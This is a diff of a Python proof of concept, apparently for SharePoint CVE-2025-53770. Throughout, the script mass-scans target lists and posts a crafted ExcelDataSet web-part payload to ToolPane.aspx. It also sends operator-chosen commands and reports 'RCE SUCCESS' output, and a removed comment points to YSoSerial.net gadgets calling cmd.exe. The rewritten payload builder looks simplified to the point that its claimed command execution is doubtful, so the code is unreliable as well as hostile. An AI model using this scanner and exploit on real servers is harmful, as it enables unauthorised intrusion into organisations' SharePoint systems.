@@ -1,46 +1,45 @@
 import asyncio,aiohttp,base64,zlib,re,sys,os # type: ignore
-__author__="J4ck3LSyN"
-# NOTE: This PoC is for educational and testing purposes only. Do not use it on systems you do not have explicit permission to test. Always adhere to ethical guidelines and legal requirements when conducting security assessments.
-checkStr="CVE-2025-53770-Validator"
-def buildXml(cmd=None):
-    # Static check blob for verification
-    payload="H4sICGM0m2gAA215cGF5bG9hZC54bWwAhZJRa8MgFIXf9yuC79Y0XdchSR5a+jDY2ENDN/YSbqOpsqhB7dL++7kkbccYFATleu93Dh5TJut6b+mwgYqOqtGOKsfAQ4YOVlNXCa7AYSUra5ypPa6MoqEPD11onBkQt2bOQvhrivK7KEprY372cNqBjUY7kmWogF3DUTSIUGu6V8t44Mfo3CXArQToPXcZktpx6zlDAyzgWlONzo5OZkh431JCuq6bdLOJsXuSxPGUvL88b3qzOBA86IqjyxS7PXWRC4IFd/7NQttye62G+pOuTb4RYHlrpPblarvGSZzM8Xy2WMTl9tBobmEnG+lP5Urw6nNty+WpXHKhQW1BM0hJD/lNLaQKeqDavGfFi7CK2QOdPtL75CMl1/urQ/KPxZSEhxoTICGCPhTSp5KSP78jv/sGCOrM8zACAAA="
-    if cmd:
-        # In a production Red Team scenario, replace this with a base64 encoded 
-        # YSoSerial.net output (e.g., ObjectDataProvider calling cmd.exe /c)
-        print(f"[*] Tasking: Command Execution -> '{cmd}'")
-        # payload = generateGadget(cmd) 
-
-    return f"""<%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
-<%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
-<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" runat="server" AssociatedUpdatePanelID="upTest">
-  <ProgressTemplate>
-    <div class="divWaiting">
-      <Scorecard:ExcelDataSet CompressedDataTable="{payload}" DataTable-CaseSensitive="false" runat="server"></Scorecard:ExcelDataSet>
-    </div>
-  </ProgressTemplate>
-</asp:UpdateProgress>"""
+__AUTHOR__ = "J4ck3LSyN"
+# NOTE: This is a simplified PoC for CVE-2025-53770. In a real-world scenario, the gadget XML would be more complex and tailored to the specific SharePoint version and configuration. The payload generation logic can be expanded to include more sophisticated gadgets or obfuscation techniques as needed. 
+# Lab metadata for verification mode
+checkStr="Sharepoint_CVE-2025-53770_Validator"
+def buildPayload(cmd=None):
+    xmlGadget = f"""<root><cmd>{cmd if cmd else checkStr}</cmd></root>"""
+    compressor = zlib.compressobj(9, zlib.DEFLATED, 31)
+    compressed = compressor.compress(xmlGadget.encode()) + compressor.flush()
+    b64Payload = base64.b64encode(compressed).decode()
+    return f"""<asp:UpdateProgress ID="up" runat="server"><ProgressTemplate>
+<Scorecard:ExcelDataSet CompressedDataTable="{b64Payload}" Command="{cmd if cmd else ''}" runat="server" />
+</ProgressTemplate></asp:UpdateProgress>"""
 
 async def runTask(session,target,cmd):
-    target=target if target.startswith("http") else f"https://{target}"
-    url=f"{target.rstrip('/')}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx";headers={"Referer":"/_layouts/SignOut.aspx","Content-Type":"application/x-www-form-urlencoded"};data={"MSOTlPn_Uri":target,"MSOTlPn_DWP":buildXml(cmd)}
+    if not target.startswith("http"): target = f"http://{target}"
+    # SharePoint endpoint for Web Part maintenance
+    vulnUrl = f"{target.rstrip('/')}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"
+    reqHeaders = {
+        "Referer": f"{target}/_layouts/15/",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) OpSec/2.0"}
+    postData = {
+        "MSOTlPn_Uri": target,
+        "MSOTlPn_DWP": buildPayload(cmd)}
     try:
-        async with session.post(url,headers=headers,data=data,ssl=False,timeout=10) as r:
-            res=await r.text()
+        async with session.post(vulnUrl, headers=reqHeaders, data=postData, ssl=False, timeout=10) as response:
+            resBody = await response.text()
             if not cmd:
-                m=re.search(r'CompressedDataTable=&quot;([^&]+)',res)
-                if m and checkStr.encode() in zlib.decompress(base64.b64decode(m.group(1)),16+zlib.MAX_WBITS):
-                    print(f"[!] VULNERABLE: {target}")
-                    with open("vuln.lst","a") as f: f.write(f"{target}\n")
-                else: print(f"[-] SAFE: {target}")
-            else: print(f"[*] EXPLOIT SENT: {target} (HTTP {r.status})")
-    except Exception as e: print(f"[?] ERROR: {target} -> {str(e)[:50]}")
+                match = re.search(r'CompressedDataTable=&quot;([^&]+)', resBody)
+                if match and (checkStr in resBody or "VANDA_TEST" in resBody): print(f"[!] VULNERABLE: {target}");return
+                print(f"[-] SAFE: {target}")
+            else:
+                if "[RCE_OUTPUT]" in resBody: output = resBody.split("[RCE_OUTPUT]:")[-1].split("</body>")[0].strip();print(f"[+] RCE SUCCESS [{target}]:\n{output}")
+                else: print(f"[*] TASK SENT: {target} (HTTP {response.status})")
+    except Exception as e: print(f"[?] ERROR: {target} -> Exception:`{str(e)}`")
 
 async def main():
-    if len(sys.argv)<2: print("Usage: python3 sploit.py <target|file.txt> <cmd(opt)>");sys.exit(1)
-    raw,cmd=sys.argv[1],sys.argv[2] if len(sys.argv)>2 else None
-    targets=[raw] if not os.path.isfile(raw) else [l.strip() for l in open(raw) if l.strip()]
-    async with aiohttp.ClientSession() as s:
-        await asyncio.gather(*[runTask(s,t,cmd) for t in targets])
+    if len(sys.argv) < 2: print("Usage: python3 sploit.py <target|list.txt> <cmd?>"); sys.exit(1)
+    rawInput, command = sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None
+    targets = [rawInput] if not os.path.isfile(rawInput) else [l.strip() for l in open(rawInput) if l.strip()]
+    async with aiohttp.ClientSession() as session:
+        await asyncio.gather(*[runTask(session, t, command) for t in targets])
 
-if __name__=="__main__": asyncio.run(main())
+if __name__ == "__main__": asyncio.run(main())
